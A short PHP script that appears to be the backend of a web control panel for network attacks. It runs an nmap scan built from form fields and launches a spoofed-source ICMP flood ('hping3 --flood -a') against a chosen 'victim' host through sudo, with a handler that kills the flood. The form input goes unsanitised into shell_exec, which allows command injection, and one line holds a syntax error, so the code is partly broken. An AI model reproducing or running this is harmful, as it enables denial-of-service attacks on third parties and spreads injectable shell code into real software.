<?php
  shell_exec('kill -9 177714');
 ?>

 <?php
   // Use ls command to shell_exec
   // function
   $NMAP = 'nmap'." ".$_POST['OPCION']." ".$_POST['VELOCIDAD']." ".$_POST['HOST_NMAP'];

   if (isset($_POST['NMAP']))
   {
     print_r($NMAP);
     print(shell_exec($NMAP));
   }



 ?>

 <?php

   // Use ls command to shell_exec
   // function
    $SMURF = 'sudo hping3 -1 --flood -a '.$_POST['ZOMBI']." "..$_POST['VICTIMA'];


   if (isset($_POST['SMURF']))
   {
     print_r($SMURF);
     shell_exec($SMURF);

   }

    if(isset($_POST['$SMURF-stop']))
      {
        shell_exec("sudo kill -9 `pidof hping3`");
      }

 ?>
